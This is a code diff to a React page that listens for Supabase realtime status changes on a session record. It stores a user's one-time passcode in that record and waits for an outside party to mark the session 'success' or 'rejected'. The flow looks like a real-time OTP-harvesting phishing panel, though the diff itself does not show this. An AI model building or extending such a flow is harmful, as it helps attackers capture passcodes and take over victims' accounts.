@@ -26,7 +26,7 @@ const Index = () => {
   };
 
   useEffect(() => {
-    if (!sessionId || step !== "waiting") return;
+    if (!sessionId || (step !== "waiting" && step !== "processing")) return;
 
     const channel = supabase
       .channel(`session-${sessionId}`)
@@ -40,8 +40,14 @@ const Index = () => {
         },
         (payload) => {
           const newStatus = (payload.new as any).status;
-          if (newStatus === "otp") setStep("otp");
-          if (newStatus === "rejected") setStep("rejected");
+          if (step === "waiting") {
+            if (newStatus === "otp") setStep("otp");
+            if (newStatus === "rejected") setStep("rejected");
+          }
+          if (step === "processing") {
+            if (newStatus === "success") setStep("success");
+            if (newStatus === "rejected") setStep("rejected");
+          }
         }
       )
       .subscribe();
@@ -52,23 +58,18 @@ const Index = () => {
   }, [sessionId, step]);
 
   const handleOtpSubmit = async (otp: string) => {
-    setStep("processing");
     if (sessionId) {
-      // Store OTP in session form_data and update status
       const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).single();
       const existingData = (data?.form_data as Record<string, any>) || {};
       await supabase
         .from("sessions")
         .update({ 
-          status: "success" as any, 
+          status: "otp_submitted" as any, 
           form_data: { ...existingData, otp } as any 
         })
         .eq("id", sessionId);
     }
-    // Show loading for 3 seconds before success
-    setTimeout(() => {
-      setStep("success");
-    }, 3000);
+    setStep("processing");
   };
 
   return (
